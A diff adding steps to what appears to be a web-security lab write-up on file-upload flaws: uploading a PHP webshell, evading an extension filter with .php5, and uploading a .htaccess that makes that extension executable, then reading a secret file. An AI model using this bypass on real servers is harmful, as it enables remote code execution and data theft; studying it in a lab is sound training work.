@@ -67,7 +67,15 @@ You can log in to your own account using the following credentials: wiener:peter
 ```
 
 1. Upload webshell.php
-
+2. Bypass restriciton with .php5
+3. Add this extension via .htaccess as executable :
+```
+filename=".htaccess"
+Content-Type : text/plain
+AddType application/x-httpd-php .php5
+```
+4. Reload your webshell and now it's interpreted
+5. cat /home/carlos/secret
 
 ---
 
